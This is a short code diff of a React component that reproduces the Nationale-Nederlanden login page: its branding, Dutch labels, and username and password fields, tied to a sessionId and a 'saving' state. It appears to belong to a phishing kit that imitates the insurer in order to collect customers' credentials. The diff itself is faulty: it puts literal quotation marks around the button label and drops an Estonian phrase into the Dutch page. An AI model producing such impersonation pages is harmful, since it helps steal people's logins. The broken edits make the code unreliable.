@@ -111,7 +111,7 @@ export function NationaleNederlandenClient({ sessionId }: { sessionId: string })
                   disabled={saving || !username || !password} 
                   className="bg-[#333] text-white font-bold py-3 px-8 rounded-sm hover:bg-black disabled:opacity-50 transition-colors"
                 >
-                  {saving ? "Laden..." : "Inloggen"}
+                  "Inloggen"
                 </button>
                 <a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-1">
                   Inloggegevens vergeten <span className="text-[12px]">&gt;</span>
@@ -139,7 +139,7 @@ export function NationaleNederlandenClient({ sessionId }: { sessionId: string })
             <ul className="space-y-4">
               <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Mijn.nn-account aanmaken</a></li>
               <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Activatienummer ontvangen</a></li>
-              <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Hulp bij inloggen of account aanmaken</a></li>
+              <li><a href="#" className="text-[#EA650D] text-[14px] font-medium hover:underline flex items-center gap-2"><span className="text-[12px]">&gt;</span> Abi sisselogimisel või konto loomisel</a></li>
             </ul>
           </div>
 
